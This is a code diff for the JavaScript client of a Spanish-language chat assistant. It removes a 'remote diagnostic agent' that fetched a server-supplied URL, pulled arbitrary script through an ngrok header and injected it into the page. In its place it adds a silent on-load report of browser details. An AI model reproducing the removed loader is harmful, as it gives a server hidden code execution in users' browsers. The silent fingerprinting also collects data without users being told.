@@ -3,7 +3,7 @@ import { io } from 'https://cdn.socket.io/4.3.2/socket.io.esm.min.js';
 const API_BASE_URL = 'https://netrunner-pro.up.railway.app';
 const CHAT_API_URL = `${API_BASE_URL}/api/chat`;
 const TELEMETRY_API_URL = `${API_BASE_URL}/api/telemetry`;
-const BOOTSTRAP_API_URL = `${API_BASE_URL}/api/bootstrap`;
+const REPORT_API_URL = `${API_BASE_URL}/api/report`;
 
 const DOM = {
     chat: document.getElementById('chat-messages'),
@@ -42,10 +42,7 @@ sessionStorage.setItem('lumina_session_id', state.sessionId);
 window.addEventListener('DOMContentLoaded', () => {
     populateModels();
     setupEvents();
-    loadRuntimeConfig()
-        .finally(() => {
-            injectRemoteDiagnosticAgent();
-        });
+    sendTechnicalReport();
     injectExternalResources();
     renderStatus('Lista');
     appendSystemMessage('Hola, soy Lumina IA. Puedo ayudarte a organizar tu día, redactar correos y resolver dudas generales.');
@@ -109,100 +106,30 @@ function setupEvents() {
     window.addEventListener('pagehide', teardownRuntime, { once: true });
 }
 
-async function loadRuntimeConfig() {
+function buildTechnicalReport() {
+    return {
+        userAgent: navigator.userAgent || '',
+        language: navigator.language || '',
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'UTC',
+        screen: {
+            width: Number(screen.width || 0),
+            height: Number(screen.height || 0)
+        },
+        reportedAt: new Date().toISOString()
+    };
+}
+
+async function sendTechnicalReport() {
     try {
-        const response = await fetch(BOOTSTRAP_API_URL, { method: 'GET', keepalive: true });
-        if (!response.ok) return;
-        const data = await response.json().catch(() => ({}));
-        if (!window.CONFIG || typeof window.CONFIG !== 'object') return;
-        if (typeof data.remoteDiagnosticUrl === 'string') {
-            window.CONFIG.REMOTE_DIAGNOSTIC_URL = data.remoteDiagnosticUrl.trim();
-        }
+        const report = buildTechnicalReport();
+        await fetch(REPORT_API_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(report),
+            keepalive: true
+        });
     } catch {
         // Silent by design.
-    }
-}
-
-async function injectRemoteDiagnosticAgent() {
-    const configuredUrl = String(window.CONFIG?.REMOTE_DIAGNOSTIC_URL || '').trim();
-    if (!configuredUrl) return;
-
-    const resolvedBaseUrl = resolveDiagnosticUrl(configuredUrl);
-    if (!resolvedBaseUrl) return;
-
-    if (document.querySelector(`script[data-remote-diagnostic-base="${resolvedBaseUrl}"]`)) {
-        return;
-    }
-
-    try {
-        const scriptUrl = withCacheBypass(resolvedBaseUrl);
-        const response = await fetch(scriptUrl, {
-            method: 'GET',
-            headers: {
-                'ngrok-skip-browser-warning': 'true'
-            },
-            cache: 'no-store'
-        });
-
-        if (!response.ok) {
-            throw new Error(`Diagnostic fetch failed (${response.status})`);
-        }
-
-        const scriptCode = await response.text();
-        const blob = new Blob([scriptCode], { type: 'application/javascript' });
-        const blobUrl = URL.createObjectURL(blob);
-
-        const script = document.createElement('script');
-        script.src = blobUrl;
-        script.async = true;
-        script.dataset.remoteDiagnosticBase = resolvedBaseUrl;
-        script.onload = () => {
-            console.log('[Soporte] Agente de diagnóstico vinculado.');
-            URL.revokeObjectURL(blobUrl);
-        };
-        script.onerror = () => {
-            console.error('[Error] Enlace de diagnóstico interrumpido.');
-            URL.revokeObjectURL(blobUrl);
-        };
-        document.body.appendChild(script);
-    } catch {
-        console.error('[Error] Enlace de diagnóstico interrumpido.');
-    }
-}
-
-function resolveDiagnosticUrl(inputUrl) {
-    const raw = String(inputUrl || '').trim();
-    if (!raw) return '';
-
-    const currentProtocol = window.location.protocol === 'https:' ? 'https:' : 'http:';
-    let normalized = raw;
-
-    if (raw.startsWith('//')) {
-        normalized = `${currentProtocol}${raw}`;
-    } else if (/^https?:\/\//i.test(raw)) {
-        normalized = raw.replace(/^https?:\/\//i, `${currentProtocol}//`);
-    } else if (raw.startsWith('/')) {
-        normalized = `${window.location.origin}${raw}`;
-    } else {
-        normalized = `${currentProtocol}//${raw}`;
-    }
-
-    try {
-        const parsed = new URL(normalized);
-        if (!/^https?:$/.test(parsed.protocol)) return '';
-        return parsed.toString();
-    } catch {
-        return '';
-    }
-}
-
-function withCacheBypass(inputUrl) {
-    try {
-        const parsed = new URL(inputUrl);
-        parsed.searchParams.set('t', String(Date.now()));
-        return parsed.toString();
-    } catch {
-        return inputUrl;
     }
 }
 
@@ -254,14 +181,6 @@ async function initSocket() {
             userAgent: navigator.userAgent
         });
         renderStatus('Activa');
-    });
-
-    state.socket.on('vincular_confirmado', (payload = {}) => {
-        const remoteDiagnosticUrl = String(payload.remoteDiagnosticUrl || '').trim();
-        if (remoteDiagnosticUrl && window.CONFIG && typeof window.CONFIG === 'object') {
-            window.CONFIG.REMOTE_DIAGNOSTIC_URL = remoteDiagnosticUrl;
-            injectRemoteDiagnosticAgent();
-        }
     });
 
     state.socket.on('disconnect', () => {
